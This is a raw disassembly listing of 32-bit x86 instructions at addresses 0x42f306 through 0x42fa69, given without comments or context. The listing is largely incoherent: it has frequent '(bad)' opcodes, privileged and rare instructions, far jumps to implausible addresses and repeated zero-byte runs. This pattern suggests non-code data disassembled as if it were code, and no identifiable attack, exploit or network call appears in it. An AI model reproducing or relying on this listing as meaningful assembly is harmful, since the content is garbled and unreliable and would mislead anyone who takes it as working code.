  42f306:	sub    eax,0xeb8f8d50
  42f30b:	cmp    BYTE PTR [ecx+0xd],0xc0
  42f30f:	adc    dl,BYTE PTR [eax]
  42f311:	adc    BYTE PTR [ecx],al
  42f313:	ret    
  42f314:	cmp    dl,BYTE PTR ss:[ebx+0x1a]
  42f318:	xchg   ebx,eax
  42f319:	std    
  42f31a:	xor    DWORD PTR [esi],eax
  42f31c:	and    al,0x8e
  42f31e:	inc    ebx
  42f31f:	nop
  42f320:	inc    ecx
  42f321:	test   DWORD PTR [eax+eax*2],edx
  42f324:	mov    bl,0xe7
  42f326:	inc    ebx
  42f327:	nop
  42f328:	loopne 0x42f31c
  42f32a:	ret    
  42f32b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f32c:	outs   dx,BYTE PTR ds:[esi]
  42f32d:	cmc    
  42f32e:	add    al,0x0
  42f330:	add    BYTE PTR [eax],al
  42f332:	add    BYTE PTR [eax],al
  42f334:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f335:	mov    esp,0xda1cd40d
  42f33a:	adc    al,0x80
  42f33c:	dec    edi
  42f33d:	pop    edi
  42f33e:	mov    BYTE PTR [ebx+0x4077f294],0x90
  42f345:	mov    bl,0x34
  42f347:	add    esp,ecx
  42f349:	xor    al,0x3a
  42f34b:	add    al,0xcd
  42f34d:	and    eax,0xd9420438
  42f352:	jmp    0xe4d2:0xf5728dab
  42f359:	jg     0x42f39a
  42f35b:	add    dl,BYTE PTR [esi]
  42f35d:	out    dx,al
  42f35e:	mov    ebp,0xa4d9c84c
  42f363:	xor    edi,DWORD PTR [ebx+0x77f0d1bf]
  42f369:	mov    dl,0x60
  42f36b:	(bad)  cs:[eax+edx*1-0x554a5a74]
  42f374:	and    ebp,DWORD PTR ds:0x727c8ffb
  42f37a:	cmc    
  42f37b:	xor    ch,ah
  42f37d:	daa    
  42f37e:	xor    ah,al
  42f380:	lahf   
  42f381:	or     BYTE PTR [edx],0x89
  42f384:	ror    DWORD PTR [esi+0x7fdd33d1],cl
  42f38a:	mov    ebp,0x9dd96fed
  42f38f:	pandn  mm5,QWORD PTR cs:[esi+0x27]
  42f394:	mov    ah,0x9e
  42f396:	pop    esp
  42f397:	mov    dl,0x0
  42f399:	add    BYTE PTR [eax],al
  42f39b:	add    BYTE PTR [eax],al
  42f39d:	(bad)  
  42f39e:	ficom  DWORD PTR [eax+edx*1-0x71]
  42f3a2:	fld    st(2)
  42f3a4:	shl    DWORD PTR [ecx+0x58e90e72],cl
  42f3aa:	mov    ebx,0x5f93e933
  42f3af:	and    al,0x72
  42f3b1:	xlat   BYTE PTR ds:[ebx]
  42f3b2:	mov    ?,esi
  42f3b4:	arpl   WORD PTR [ebp+eiz*2+0x3c],dx
  42f3b8:	add    DWORD PTR [edi],edx
  42f3ba:	icebp  
  42f3bb:	jmp    0x42f3cb
  42f3bd:	or     cl,cl
  42f3bf:	xchg   ecx,eax
  42f3c0:	call   FWORD PTR [esi+0x189441b9]
  42f3c6:	jne    0x42f3fa
  42f3c8:	rol    ebx,1
  42f3ca:	frstor [edx-0x3b]
  42f3cd:	inc    DWORD PTR [edx-0x3b43c3bf]
  42f3d3:	push   cs
  42f3d4:	jmp    0xbb2e7934
  42f3d9:	pop    edi
  42f3da:	sbb    DWORD PTR [ebx-0x20],esp
  42f3dd:	or     bl,ch
  42f3df:	div    BYTE PTR [esi-0x24]
  42f3e2:	fucomi st,st(3)
  42f3e4:	jb     0x42f3fd
  42f3e6:	test   bl,ch
  42f3e8:	fdiv   QWORD PTR [ebx+0x8e94ec2]
  42f3ee:	repz dec ebx
  42f3f0:	inc    edi
  42f3f1:	or     DWORD PTR [bx-0x635b],0x61383e17
  42f3fa:	jg     0x42f440
  42f3fc:	ss ret 0xf6e9
  42f400:	push   edi
  42f401:	add    BYTE PTR [eax],al
  42f403:	add    BYTE PTR [eax],al
  42f405:	add    BYTE PTR ds:0xb06aebdd,bl
  42f40b:	mov    ?,esi
  42f40d:	call   0xe956cbeb
  42f412:	xchg   ebx,eax
  42f413:	das    
  42f414:	div    DWORD PTR [eax-0x60]
  42f417:	mov    es,WORD PTR [edx]
  42f419:	sbb    ebp,DWORD PTR [ecx]
  42f41b:	daa    
  42f41c:	pop    ebx
  42f41d:	or     eax,0x26efd064
  42f422:	std    
  42f423:	fcom   QWORD PTR [edi+0x1bf85500]
  42f429:	test   BYTE PTR [ecx-0x3e],bh
  42f42c:	xor    DWORD PTR [ebp+0x4ffff7ed],ecx
  42f432:	push   ds
  42f433:	mov    cl,BYTE PTR [esi]
  42f435:	push   0x47
  42f437:	mov    edi,esp
  42f439:	adc    eax,0x2bde95
  42f43e:	mov    dl,0x3e
  42f440:	ins    DWORD PTR es:[edi],dx
  42f441:	(bad)  
  42f442:	xchg   esi,eax
  42f443:	test   al,0xfe
  42f445:	std    
  42f446:	mov    edx,0x8a03e52e
  42f44b:	mov    al,0x93
  42f44d:	push   esp
  42f44e:	int    0xc7
  42f450:	hlt    
  42f451:	retf   0xac13
  42f454:	dec    eax
  42f455:	test   edi,ecx
  42f457:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f458:	adc    eax,0x70c368b
  42f45d:	enter  0x3ec6,0x3d
  42f461:	call   FWORD PTR [edi-0x1463fcc3]
  42f467:	jae    0x42f477
  42f469:	mov    eax,DWORD PTR [eax]
  42f46b:	add    BYTE PTR [eax],al
  42f46d:	add    BYTE PTR [eax],al
  42f46f:	out    dx,al
  42f470:	sahf   
  42f471:	dec    eax
  42f472:	pop    ebp
  42f473:	mov    ds:0x9cc3459b,al
  42f478:	sub    eax,edi
  42f47a:	push   ecx
  42f47b:	psubusw mm5,QWORD PTR [ebx+0xdae6d82]
  42f482:	push   esi
  42f483:	pop    esi
  42f484:	sub    edx,edi
  42f486:	mov    eax,DWORD PTR [eax]
  42f488:	test   eax,0xbbd25326
  42f48d:	ins    BYTE PTR es:[edi],dx
  42f48e:	inc    esp
  42f48f:	jns    0x42f433
  42f491:	out    0x15,eax
  42f493:	stc    
  42f494:	loope  0x42f4c1
  42f496:	add    bh,bh
  42f498:	fsubr  DWORD PTR [ebx+0xdb33d82]
  42f49e:	jne    0x42f433
  42f4a0:	push   es
  42f4a1:	shl    ebx,0x90
  42f4a4:	add    BYTE PTR [edx-0x1f02af7d],0x7f
  42f4ab:	popf   
  42f4ac:	mov    DWORD PTR [ebp-0x55356fbd],ecx
  42f4b2:	add    al,0x54
  42f4b4:	dec    ebx
  42f4b5:	sub    eax,DWORD PTR [eax]
  42f4b7:	push   ebp
  42f4b8:	pop    esp
  42f4b9:	dec    ebp
  42f4ba:	add    bl,al
  42f4bc:	nop
  42f4bd:	cld    
  42f4be:	out    0x82,eax
  42f4c0:	or     DWORD PTR [eax],edx
  42f4c2:	push   edi
  42f4c3:	or     eax,0xbe4f8406
  42f4c8:	xor    edx,DWORD PTR [eax]
  42f4ca:	xchg   edi,ebx
  42f4cc:	xchg   DWORD PTR [esp+edi*8],ebp
  42f4cf:	ror    cl,0xf
  42f4d2:	add    BYTE PTR [eax],al
  42f4d4:	add    BYTE PTR [eax],al
  42f4d6:	add    BYTE PTR [eax],al
  42f4d8:	call   0xf83d8fc6
  42f4dd:	cmp    BYTE PTR [ebx],bh
  42f4df:	sti    
  42f4e0:	test   ecx,edx
  42f4e2:	in     eax,0x3f
  42f4e4:	nop
  42f4e5:	dec    esi
  42f4e6:	shl    BYTE PTR [ebx-0x80],cl
  42f4e9:	jno    0x42f525
  42f4eb:	lahf   
  42f4ec:	push   eax
  42f4ed:	leave  
  42f4ee:	and    eax,0xe521a5fb
  42f4f3:	aas    
  42f4f4:	nop
  42f4f5:	fcmovne st,st(7)
  42f4f7:	out    0x92,al
  42f4f9:	pop    ecx
  42f4fa:	adc    DWORD PTR [ebx+0x56],ebx
  42f4fd:	adc    dl,ah
  42f4ff:	push   esp
  42f500:	sbb    edi,DWORD PTR ds:0x98df222
  42f506:	xchg   ebp,eax
  42f507:	inc    ebx
  42f508:	nop
  42f509:	retf   0x5325
  42f50c:	or     edi,DWORD PTR [ebx]
  42f50e:	ins    BYTE PTR es:[edi],dx
  42f50f:	clc    
  42f510:	add    eax,0x8b724f4
  42f515:	dec    edx
  42f516:	push   esi
  42f517:	add    bl,ah
  42f519:	pop    esp
  42f51a:	in     eax,0xef
  42f51c:	mov    ds:0x95f2128b,al
  42f521:	mov    dl,0x35
  42f523:	xchg   bl,dl
  42f525:	mov    dl,0xf6
  42f527:	sbb    BYTE PTR [esi+0x5a96aaca],al
  42f52d:	(bad)  
  42f52e:	jno    0x42f4f4
  42f530:	ret    
  42f531:	ret    
  42f532:	jne    0x42f535
  42f534:	push   eax
  42f535:	xor    DWORD PTR [edx-0x5126efd],esi
  42f53b:	mov    DWORD PTR [eax],0x0
  42f541:	mov    ch,0x6e
  42f543:	cmc    
  42f544:	mov    al,0xfe
  42f546:	jo     0x42f53d
  42f548:	ss sub eax,eax
  42f54b:	std    
  42f54c:	cmc    
  42f54d:	pop    edi
  42f54e:	mov    dl,0xa0
  42f550:	or     ah,0xd6
  42f553:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f554:	cmp    DWORD PTR [esi-0x4e],esi
  42f557:	pusha  
  42f558:	ret    
  42f559:	shr    BYTE PTR [edi-0x17],cl
  42f55c:	sar    edi,cl
  42f55e:	aad    0xf5
  42f560:	fwait
  42f561:	sbb    bl,ch
  42f563:	cld    
  42f564:	xchg   edx,eax
  42f565:	pop    edi
  42f566:	jge    0x42f55c
  42f568:	clc    
  42f569:	xchg   edi,eax
  42f56a:	mov    esp,0xf3150435
  42f56f:	dec    ecx
  42f570:	hlt    
  42f571:	outs   dx,DWORD PTR ds:[esi]
  42f572:	push   edx
  42f573:	cwde   
  42f574:	inc    ebx
  42f575:	nop
  42f576:	jl     0x42f54c
  42f578:	clc    
  42f579:	fcmovnb st,st(0)
  42f57b:	xor    eax,0xd0f26e04
  42f580:	add    eax,0x321cb400
  42f585:	fyl2x  
  42f587:	es call 0xb390:0x4777f28c
  42f58f:	sub    BYTE PTR [ecx],bh
  42f591:	inc    edx
  42f592:	jge    0x42f604
  42f594:	lea    edx,[esi]
  42f596:	jecxz  0x42f582
  42f598:	fnstcw WORD PTR [esi]
  42f59a:	pop    edx
  42f59b:	ja     0x42f5e4
  42f59d:	nop
  42f59e:	or     DWORD PTR [esi],0xc57876
  42f5a4:	sub    DWORD PTR [eax],eax
  42f5a6:	add    BYTE PTR [eax],al
  42f5a8:	add    BYTE PTR [eax],al
  42f5aa:	xchg   esp,eax
  42f5ab:	loopne 0x42f5be
  42f5ad:	sub    DWORD PTR ds:0x78e80e71,ecx
  42f5b3:	mov    esp,0xd7fd3cf6
  42f5b8:	jmp    0x42f61f
  42f5ba:	push   ebx
  42f5bb:	popa   
  42f5bc:	std    
  42f5bd:	push   0xa590f290
  42f5c2:	xchg   ebx,eax
  42f5c3:	mov    bl,0xd3
  42f5c5:	in     al,dx
  42f5c6:	dec    edi
  42f5c7:	push   edi
  42f5c8:	push   edx
  42f5c9:	jmp    0xe993f9ae
  42f5ce:	pop    esi
  42f5cf:	fld    DWORD PTR [ecx]
  42f5d1:	adc    DWORD PTR ds:0x20620e95,esp
  42f5d7:	rol    DWORD PTR [ecx+ebp*4],0x93
  42f5db:	daa    
  42f5dc:	push   ebx
  42f5dd:	int    0x3
  42f5df:	gs inc esp
  42f5e1:	xchg   ebx,eax
  42f5e2:	xchg   ebx,eax
  42f5e3:	dec    esp
  42f5e4:	adc    BYTE PTR [ebx+edx*1],dh
  42f5e7:	aad    0xeb
  42f5e9:	jmp    0xdbe2198
  42f5ee:	clc    
  42f5ef:	xlat   BYTE PTR ds:[ebx]
  42f5f0:	mov    edi,0x3460d464
  42f5f5:	fs dec eax
  42f5f7:	mov    ?,esi
  42f5f9:	cmp    BYTE PTR [edx-0x36acf1b4],cl
  42f5ff:	jg     0x42f596
  42f601:	dec    ebp
  42f602:	test   al,0x90
  42f604:	jmp    0x42f5a0
  42f606:	unpckhps xmm4,XMMWORD PTR [ebx-0x28]
  42f60a:	dec    sp
  42f60c:	push   cs
  42f60d:	aas    
  42f60e:	add    BYTE PTR [eax],al
  42f610:	add    BYTE PTR [eax],al
  42f612:	add    BYTE PTR [ecx],al
  42f614:	mov    esi,0xb253f76e
  42f619:	(bad)  
  42f61a:	lods   eax,DWORD PTR ds:[esi]
  42f61b:	nop
  42f61c:	test   dh,cl
  42f61e:	adc    BYTE PTR [esi-0x51fff1de],0xa0
  42f625:	dec    ecx
  42f626:	pop    ebx
  42f627:	mov    al,0xed
  42f629:	pop    esp
  42f62a:	push   ebp
  42f62b:	xchg   edi,eax
  42f62c:	cdq    
  42f62d:	xchg   ebx,eax
  42f62e:	stc    
  42f62f:	repnz add al,0x92
  42f632:	xadd   DWORD PTR [ebx-0x1e],eax
  42f636:	(bad)  
  42f637:	mov    esi,0x5d6af355
  42f63c:	mov    BYTE PTR [ebx],bh
  42f63e:	not    BYTE PTR [ebx-0x20]
  42f641:	ins    BYTE PTR es:[edi],dx
  42f642:	std    
  42f643:	data16 mov bl,0x52
  42f646:	lock icebp 
  42f648:	cs jmp 0x42f64d
  42f64b:	cs ins BYTE PTR es:[edi],dx
  42f64d:	ficom  WORD PTR [esi+0x53]
  42f650:	mov    al,0x5b
  42f652:	jmp    DWORD PTR [eax+edx*4]
  42f655:	add    BYTE PTR [eax+0x29],al
  42f658:	das    
  42f659:	ror    BYTE PTR [edi+eax*1],1
  42f65c:	pop    ecx
  42f65d:	xor    al,0x4d
  42f65f:	sub    al,0xbc
  42f661:	or     BYTE PTR [ebx+0x45fdb9c],al
  42f667:	cmp    esi,eax
  42f669:	hlt    
  42f66a:	xor    BYTE PTR [ebx],dl
  42f66c:	loopne 0x42f608
  42f66e:	inc    edi
  42f66f:	clc    
  42f670:	lahf   
  42f671:	cdq    
  42f672:	inc    ebx
  42f673:	loope  0x42f614
  42f675:	out    0x15,eax
  42f677:	add    BYTE PTR [eax],al
  42f679:	add    BYTE PTR [eax],al
  42f67b:	add    BYTE PTR [ebp+0x6a002bd8],bl
  42f681:	jmp    0x42f69a
  42f683:	jmp    0x42f63c
  42f685:	push   esi
  42f686:	push   eax
  42f687:	add    DWORD PTR [eax+0x6e],eax
  42f68a:	adc    cl,BYTE PTR [edi]
  42f68c:	inc    edi
  42f68d:	push   0x1c
  42f68f:	data16 xor dh,BYTE PTR [edx-0x3]
  42f693:	gs clc 
  42f695:	adc    BYTE PTR [esi+eiz*2],dl
  42f698:	mov    ds:0x62896e17,al
  42f69d:	lods   al,BYTE PTR ds:[esi]
  42f69e:	sahf   
  42f69f:	add    DWORD PTR [eax-0x14a2df64],edx
  42f6a5:	or     BYTE PTR [ebx+0x23b8dceb],dl
  42f6ab:	push   edx
  42f6ac:	out    0xc1,eax
  42f6ae:	adc    cl,BYTE PTR [eax]
  42f6b0:	nop
  42f6b1:	leave  
  42f6b2:	ret    0xc3d6
  42f6b5:	inc    esp
  42f6b6:	les    esp,FWORD PTR [edi]
  42f6b8:	adc    eax,DWORD PTR ds:0x606a8710
  42f6be:	or     BYTE PTR [eax-0x77395a1c],0xc4
  42f6c5:	lods   eax,DWORD PTR ds:[esi]
  42f6c6:	ret    0x9dfa
  42f6c9:	icebp  
  42f6ca:	loope  0x42f70b
  42f6cc:	nop
  42f6cd:	pusha  
  42f6ce:	xchg   edi,eax
  42f6cf:	test   BYTE PTR [edi],dh
  42f6d1:	push   ss
  42f6d2:	pcmpgtd mm3,QWORD PTR [eax+0x7e33e484]
  42f6d9:	or     DWORD PTR [eax],edx
  42f6db:	cs push eax
  42f6dd:	ret    0xa2
  42f6e0:	add    BYTE PTR [eax],al
  42f6e2:	add    BYTE PTR [eax],al
  42f6e4:	add    BYTE PTR [eax-0x67be9537],dl
  42f6ea:	push   edx
  42f6eb:	push   ebx
  42f6ec:	and    al,0xb4
  42f6ee:	pusha  
  42f6ef:	push   esp
  42f6f0:	or     BYTE PTR [edx-0x39],ch
  42f6f3:	push   0x6b15ac43
  42f6f8:	inc    ebx
  42f6f9:	mov    ah,0x59
  42f6fb:	cmp    BYTE PTR [edx+0x19],ah
  42f6fe:	ins    DWORD PTR es:[edi],dx
  42f6ff:	not    BYTE PTR [ebx]
  42f701:	or     DWORD PTR [ebp+0x90d1ff6],eax
  42f707:	pop    es
  42f708:	pop    es
  42f709:	cmp    cl,al
  42f70b:	cmp    cl,BYTE PTR [ecx-0x77395ab4]
  42f711:	dec    esp
  42f712:	lods   eax,DWORD PTR ds:[esi]
  42f713:	repnz cli 
  42f715:	cmp    al,0xa5
  42f717:	or     cl,BYTE PTR [ebp+0x4ec2ad54]
  42f71d:	inc    eax
  42f71e:	mov    dl,0x26
  42f720:	jl     0x42f75d
  42f722:	mov    ss,edi
  42f724:	mov    ?,WORD PTR [edx+ebp*1-0x19]
  42f728:	inc    ebx
  42f729:	nop
  42f72a:	(bad)  
  42f72b:	test   DWORD PTR [eax+edx*4],0xf687e4b2
  42f732:	mov    bl,0xf5
  42f734:	add    ecx,DWORD PTR ds:0xeef8e9f3
  42f73a:	retf   0xfef6
  42f73d:	or     al,0x8e
  42f73f:	test   BYTE PTR [ebx],0x90
  42f742:	cmp    eax,0x96eb7b43
  42f747:	sbb    DWORD PTR [ecx+0x0],eax
  42f74d:	add    bl,dl
  42f74f:	xchg   esi,eax
  42f750:	loop   0x42f6ec
  42f752:	xchg   ebx,eax
  42f753:	aas    
  42f754:	mov    edx,0xb23ba3e7
  42f759:	out    0x9b,eax
  42f75b:	aas    
  42f75c:	mov    edx,0x3c6267e7
  42f761:	push   ss
  42f762:	cwde   
  42f763:	ror    DWORD PTR [ebx+0x9a81b07],1
  42f769:	stc    
  42f76a:	push   edi
  42f76b:	mov    dl,0x7a
  42f76d:	les    ebx,FWORD PTR [edx-0x6ffb3bc9]
  42f773:	mov    dl,0xeb
  42f775:	inc    edi
  42f776:	mov    ah,0x8a
  42f778:	idiv   dh
  42f77a:	adc    edx,DWORD PTR [ebx]
  42f77c:	test   BYTE PTR [ebx],0x90
  42f77f:	mov    ebx,DWORD PTR [ecx+0x7ac1abe7]
  42f785:	cld    
  42f786:	nop
  42f787:	mov    dl,0xf5
  42f789:	jp     0x42f71c
  42f78b:	pop    edx
  42f78c:	cmc    
  42f78d:	sti    
  42f78e:	iret   
  42f78f:	shl    DWORD PTR [ebx+edi*2],1
  42f792:	(bad)  
  42f794:	add    eax,0x11770908
  42f799:	in     al,dx
  42f79a:	or     al,0xf3
  42f79c:	push   cs
  42f79d:	xor    DWORD PTR [ecx+edi*1-0x4283fabd],eax
  42f7a4:	sub    BYTE PTR [eax-0x5cd82e5],0x8
  42f7ab:	add    BYTE PTR [ebx-0x3e],ah
  42f7ae:	or     dl,al
  42f7b0:	call   0x0:0x1d
  42f7b7:	js     0x42f762
  42f7b9:	cmp    eax,0x9764b91e
  42f7be:	mov    bl,0x6
  42f7c0:	adc    DWORD PTR [edx],0x92bc536d
  42f7c6:	xchg   DWORD PTR [ebx-0x5fdef14e],edx
  42f7cc:	xchg   esi,eax
  42f7cd:	(bad)  
  42f7ce:	in     eax,dx
  42f7cf:	or     BYTE PTR [ebx],bl
  42f7d1:	psubsw mm2,QWORD PTR [ebx+0x34055339]
  42f7d8:	ss iret 
  42f7da:	(bad)  
  42f7db:	fcom   DWORD PTR cs:[edx]
  42f7de:	gs hlt 
  42f7e0:	inc    ebp
  42f7e1:	cmp    al,0x36
  42f7e3:	xchg   DWORD PTR [esi-0x33af9d86],edx
  42f7e9:	(bad)  
  42f7ea:	int    0x7f
  42f7ec:	bound  eax,QWORD PTR [ebx+0x11]
  42f7ef:	or     edx,0x111716eb
  42f7f5:	sbb    al,0x65
  42f7f7:	push   0x7ae9ebd1
  42f7fc:	mov    bl,0x76
  42f7fe:	jmp    0x9f2ec8fe
  42f803:	push   0xfffffffb
  42f805:	jmp    0x42f7a0
  42f807:	(bad)  
  42f808:	cmp    edx,DWORD PTR [ebx+0xd]
  42f80b:	in     al,dx
  42f80c:	xor    eax,0x365860cf
  42f811:	iret   
  42f812:	push   eax
  42f813:	ret    
  42f814:	retf   
  42f815:	add    DWORD PTR [ecx],ebx
  42f817:	mov    esi,0xe90
  42f81c:	add    BYTE PTR [eax],al
  42f81e:	add    BYTE PTR [eax],al
  42f820:	xchg   esp,eax
  42f821:	jecxz  0x42f853
  42f823:	add    BYTE PTR [ecx-0x46746d33],ch
  42f829:	mov    ah,0xe
  42f82b:	imul   BYTE PTR [ebp-0x26]
  42f82e:	and    esp,DWORD PTR [eax]
  42f830:	jge    0x42f808
  42f832:	es pop esp
  42f834:	int    0x84
  42f836:	popa   
  42f837:	ins    BYTE PTR es:[edi],dx
  42f838:	repnz stos BYTE PTR es:[edi],al
  42f83a:	xor    bl,BYTE PTR [ecx+eiz*2]
  42f83d:	fisub  WORD PTR [edx+0xf]
  42f840:	mov    ds:0x6d75e7b3,eax
  42f845:	aas    
  42f846:	add    edx,esp
  42f848:	dec    esp
  42f849:	je     0x42f859
  42f84b:	test   DWORD PTR [ecx],edi
  42f84d:	test   al,0x6f
  42f84f:	(bad)  
  42f850:	outs   dx,DWORD PTR ds:[esi]
  42f851:	mov    ch,0x8e
  42f853:	jl     0x42f7e2
  42f855:	retf   0x750e
  42f858:	ds xor al,0x68
  42f85b:	and    al,0x3c
  42f85d:	mov    ch,0x62
  42f85f:	dec    edx
  42f860:	(bad)  
  42f861:	stos   BYTE PTR es:[edi],al
  42f862:	xor    ch,BYTE PTR [eax-0x5c]
  42f865:	jp     0x42f899
  42f867:	xor    BYTE PTR [edx],cl
  42f869:	test   bh,ah
  42f86b:	je     0x42f7fa
  42f86d:	shr    al,cl
  42f86f:	adc    eax,0x2bc3a1
  42f874:	xor    al,0xb2
  42f876:	or     eax,0x20a7f900
  42f87b:	mov    eax,DWORD PTR [ebp+0x7d8b33d7]
  42f881:	xlat   BYTE PTR ds:[ebx]
  42f882:	das    
  42f883:	jmp    0x42f888
  42f888:	add    BYTE PTR [edi+0x70ffe940],dh
  42f88e:	xor    BYTE PTR [edx],0x18
  42f891:	xchg   edx,eax
  42f892:	pop    edi
  42f893:	jno    0x42f89b
  42f895:	push   edx
  42f896:	jnp    0x42f864
  42f898:	add    ebp,ecx
  42f89a:	mov    bl,0x6b
  42f89c:	clc    
  42f89d:	nop
  42f89e:	fucomi st,st(2)
  42f8a0:	inc    ebx
  42f8a1:	jmp    0x5cc9f09a
  42f8a6:	mov    ebp,0x44a2e6be
  42f8ab:	cmp    esp,DWORD PTR [eax+eax*2]
  42f8ae:	hlt    
  42f8af:	jmp    0x42f872
  42f8b1:	dec    esp
  42f8b2:	mov    ch,0xe0
  42f8b4:	add    BYTE PTR [ebx+0x6f4b56de],ch
  42f8ba:	(bad)  [edi]
  42f8bc:	xchg   DWORD PTR [edi+0x31],ebx
  42f8bf:	cmp    BYTE PTR [esi-0x296abf79],0x4
  42f8c6:	loope  0x42f8e6
  42f8c8:	sti    
  42f8c9:	popf   
  42f8ca:	add    eax,0x53903fe2
  42f8cf:	push   ebx
  42f8d0:	and    al,0x82
  42f8d2:	sar    BYTE PTR [ebx*2+0x53d35cbb],0x52
  42f8da:	fisttp QWORD PTR [edi]
  42f8dc:	jg     0x42f91a
  42f8de:	leave  
  42f8df:	and    DWORD PTR [ebx+0x1b],edx
  42f8e2:	bound  edi,QWORD PTR [esi-0xbf2f60f]
  42f8e8:	vmwrite ecx,DWORD PTR [eax]
  42f8eb:	adc    al,0xb
  42f8ed:	add    BYTE PTR [eax],al
  42f8ef:	add    BYTE PTR [eax],al
  42f8f1:	add    BYTE PTR [esi],bl
  42f8f3:	aaa    
  42f8f4:	adc    BYTE PTR [eax],al
  42f8f6:	nop
  42f8f7:	sub    al,0xbf
  42f8f9:	(bad)  
  42f8fa:	lds    eax,FWORD PTR [ecx+ecx*4+0x3e]
  42f8fe:	or     DWORD PTR ds:0x51913f4,edi
  42f904:	hlt    
  42f905:	sbb    ecx,edi
  42f907:	adc    al,0xf4
  42f909:	(bad)  
  42f90b:	(bad)  [edi]
  42f90d:	add    BYTE PTR [ebx],cl
  42f90f:	loopne 0x42f91f
  42f911:	int    0xf8
  42f913:	xchg   esi,eax
  42f914:	adc    DWORD PTR [eax],eax
  42f916:	nop
  42f917:	push   ebp
  42f918:	iret   
  42f919:	je     0x42f8a1
  42f91b:	mov    dl,0x2b
  42f91d:	jg     0x42f8e9
  42f91f:	fst    DWORD PTR [edx+0x70b29001]
  42f925:	inc    eax
  42f926:	ins    BYTE PTR es:[edi],dx
  42f927:	mov    ds:0xda3f3f0b,al
  42f92c:	or     eax,0xc089a487
  42f931:	xor    eax,0x2ae0db17
  42f936:	mov    WORD PTR [ebp+0x37],cs
  42f939:	jg     0x42f976
  42f93b:	xchg   esi,eax
  42f93c:	in     eax,0x7e
  42f93e:	and    edx,DWORD PTR [esi+0x3f9a7ee1]
  42f944:	cmp    al,0xfc
  42f946:	xchg   bl,dh
  42f948:	(bad)  
  42f94a:	iret   
  42f94b:	aas    
  42f94c:	aaa    
  42f94d:	cld    
  42f94e:	jbe    0x42f941
  42f950:	add    eax,0xcb56848b
  42f955:	inc    ebx
  42f956:	add    BYTE PTR [eax],al
  42f958:	add    BYTE PTR [eax],al
  42f95a:	add    BYTE PTR [eax+0x14f8b231],dl
  42f960:	repz retf 0xbcf7
  42f964:	cmp    DWORD PTR ds:0xf5b7ee9c,edi
  42f96a:	add    edx,ebp
  42f96c:	xor    DWORD PTR [ecx-0x34],edx
  42f96f:	aam    0x31
  42f971:	cmp    esp,ecx
  42f973:	jle    0x42f9d2
  42f975:	icebp  
  42f976:	pop    es
  42f977:	pop    edx
  42f978:	cmp    ch,BYTE PTR [edx-0x65c68021]
  42f97e:	fistp  QWORD PTR [ebx+0x39]
  42f981:	mov    edx,0x9a3987df
  42f986:	fbld   TBYTE PTR [ebx+0x4786b874]
  42f98c:	mov    edi,DWORD PTR [eax-0x3f]
  42f98f:	(bad)  
  42f990:	cmp    ebp,DWORD PTR [edx-0x21]
  42f993:	lahf   
  42f994:	cmp    ecx,DWORD PTR [edx+0xf3b8bdf]
  42f99a:	lods   eax,DWORD PTR ds:[esi]
  42f99b:	(bad)  
  42f99c:	mov    ebp,0xa1bf7d95
  42f9a1:	daa    
  42f9a2:	pop    esi
  42f9a3:	nop
  42f9a4:	mov    ecx,0xc91b529a
  42f9a9:	jmp    0x42f9df
  42f9ab:	ja     0x42fa16
  42f9ad:	dec    esp
  42f9ae:	push   0xffffffff
  42f9b0:	mov    ebp,0x41371fcf
  42f9b5:	xor    dh,cl
  42f9b7:	bound  esi,QWORD PTR ds:0xd5e962e6
  42f9bd:	aaa    
  42f9be:	out    0x0,eax
  42f9c0:	add    BYTE PTR [eax],al
  42f9c2:	add    BYTE PTR [eax],al
  42f9c4:	xchg   ebx,eax
  42f9c5:	mov    dl,0x92
  42f9c7:	test   eax,0x27999287
  42f9cc:	mov    WORD PTR [ebp-0x69],?
  42f9cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f9d0:	sub    ebp,esi
  42f9d2:	adc    ecx,ebp
  42f9d4:	xchg   ebx,eax
  42f9d5:	aaa    
  42f9d6:	iret   
  42f9d7:	add    BYTE PTR [ebp+0x63],bh
  42f9da:	xchg   edi,eax
  42f9db:	scas   al,BYTE PTR es:[edi]
  42f9dc:	or     ebp,DWORD PTR [ebp+ecx*1-0x17]
  42f9e0:	xchg   ebx,eax
  42f9e1:	ss iret 
  42f9e3:	hlt    
  42f9e4:	nop
  42f9e5:	popf   
  42f9e6:	into   
  42f9e7:	test   eax,0x2920cef6
  42f9ec:	jp     0x42fa56
  42f9ee:	shr    ch,1
  42f9f0:	xchg   ebx,eax
  42f9f1:	addr16 xchg edi,eax
  42f9f3:	cmp    eax,0x9e447d84
  42f9f8:	mov    eax,0x9851ea7e
  42f9fd:	jmp    0x2e91:0xc5a636eb
  42fa04:	(bad)  
  42fa05:	js     0x42f99e
  42fa07:	les    ecx,FWORD PTR [edi]
  42fa09:	dec    esp
  42fa0a:	out    0xe8,eax
  42fa0c:	xchg   edi,eax
  42fa0d:	jo     0x42fa87
  42fa0f:	loope  0x42f9b6
  42fa11:	mov    dl,0xeb
  42fa13:	aam    0xdb
  42fa15:	dec    ebx
  42fa16:	push   edx
  42fa17:	add    cl,ch
  42fa19:	aaa    
  42fa1a:	add    edi,DWORD PTR [eax-0x35]
  42fa1d:	jo     0x42fa2d
  42fa1f:	mov    ebp,ecx
  42fa21:	dec    esp
  42fa22:	fnsave [eax+esi*8+0x33]
  42fa26:	add    BYTE PTR cs:[eax],al
  42fa29:	add    BYTE PTR [eax],al
  42fa2b:	add    BYTE PTR [eax],al
  42fa2d:	push   0xffffff90
  42fa2f:	adc    al,BYTE PTR [eax]
  42fa31:	loop   0x42f9e6
  42fa33:	cmp    esi,esi
  42fa35:	xor    al,0x20
  42fa37:	pusha  
  42fa38:	and    DWORD PTR [edx],esi
  42fa3a:	or     BYTE PTR [edi+0x1298403e],dl
  42fa40:	call   0x2c3264
  42fa45:	cmp    bh,BYTE PTR [eax-0x3093feee]
  42fa4b:	xchg   esp,eax
  42fa4c:	push   cs
  42fa4d:	add    DWORD PTR [eax+0x4e2effac],edi
  42fa53:	aad    0xeb
  42fa55:	ja     0x42faa6
  42fa57:	int    0xeb
  42fa59:	jo     0x42faaa
  42fa5b:	fsubr  st,st(0)
  42fa5d:	sahf   
  42fa5e:	hlt    
  42fa5f:	call   0x49332563
  42fa64:	pop    esi
  42fa65:	add    BYTE PTR [edi],0xad
  42fa68:	push   ebx
  42fa69:	xchg   DWORD PTR [ecx-0x2f3e0e6d],eax
